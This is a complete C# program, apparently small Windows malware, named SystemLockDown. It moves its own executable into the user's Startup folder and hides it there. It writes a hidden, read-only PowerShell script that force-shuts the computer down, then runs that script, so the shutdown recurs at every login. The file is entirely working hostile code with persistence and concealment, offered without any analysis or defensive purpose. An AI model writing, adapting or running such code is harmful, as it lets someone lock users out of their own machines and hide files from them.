using System;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Security.Permissions;

public sealed class SystemLockDown
{   
    private string localStartupDir;
    private string powerShellFilePath;
    private readonly string POWERSHELL_FILENAME = @"SystemLockDown.ps1"; 
    private readonly string POWERSHELL_CMD = @"Set-ExecutionPolicy RemoteSigned --Unlock"
                            +Environment.NewLine+"Stop-Computer -Force"+Environment.NewLine+
                            "Start-Sleep -s 15";
    private readonly string POWERSHELL_EXE = "Powershell.exe";
    private readonly string C_SHARP_EXE = @"SystemLockDown.exe";

    public SystemLockDown(){
        localStartupDir = getLocalStartupDir();
        this.powerShellFilePath = localStartupDir + this.POWERSHELL_FILENAME;     
    }

    public string getLocalStartupDir(){
        string pathTemplate = @"C:\Users\{0}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"; 
        return pathTemplate.Replace("{0}", Environment.UserName);
        }

    public string getPowerShellFilePath(){ return this.powerShellFilePath;}

    private string getAppCurrentDirectory(){
        string dir = "";
        try{
            dir = Directory.GetCurrentDirectory();
        }
        catch(Exception e){
            Console.WriteLine("Exception caught " + e.ToString()); 
        }
        return dir + @"\";
    }

    //TODO: This method was made in an attempt to alter globalStartupDir
    public void alterDirectoryPermissions(){
        FileIOPermission f = new FileIOPermission(FileIOPermissionAccess.Write, localStartupDir);
        try{
            Console.WriteLine("Demanding now...");
            f.Demand();
            Console.WriteLine("Demand finished...");
        }
        catch(Exception e){
           Console.WriteLine("Exception caught " + e.ToString()); 
        }
    }

    public void moveExeToStartupDir(){
        string cSharpFilePath = localStartupDir + C_SHARP_EXE;
        if(!(File.Exists(cSharpFilePath))){
            try{
                File.Move(this.getAppCurrentDirectory() + C_SHARP_EXE,cSharpFilePath);
                File.SetAttributes(cSharpFilePath, FileAttributes.Hidden | FileAttributes.ReadOnly);
            }
            catch(Exception e){
                Console.WriteLine("Exception caught " + e.ToString()); 
            }
        }
        else{
           Console.WriteLine("File: " + C_SHARP_EXE + " already exists within " + localStartupDir); 
        }
        }

    public void createTurnOffFile(){
        if(!(File.Exists(this.powerShellFilePath))){
            try{
                File.WriteAllText(this.powerShellFilePath, POWERSHELL_CMD);
                File.SetAttributes(this.powerShellFilePath, FileAttributes.Hidden | FileAttributes.ReadOnly);
            }
            catch(Exception e){
            Console.WriteLine("Exception caught " + e.ToString()); 
        }
        }
        else{
           Console.WriteLine("File \"" + this.powerShellFilePath + "\" already exists!"); 
        }
    }

    public void runTurnOffFile(){
        if(File.Exists(this.powerShellFilePath)){
            try{
                Process.Start(POWERSHELL_EXE," -File " +"\""+this.powerShellFilePath+"\"");
            }
            catch(Exception e){
            Console.WriteLine("Exception caught " + e.ToString()); 
        }
        }
        else{
            Console.WriteLine("File not created thus cannot be executed.");
        }
    }

    public static void Main()
        {        
        SystemLockDown sysOff = new SystemLockDown();
        //sysOff.alterDirectoryPermissions();
        sysOff.moveExeToStartupDir();
        sysOff.createTurnOffFile();
        sysOff.runTurnOffFile();
        }
}


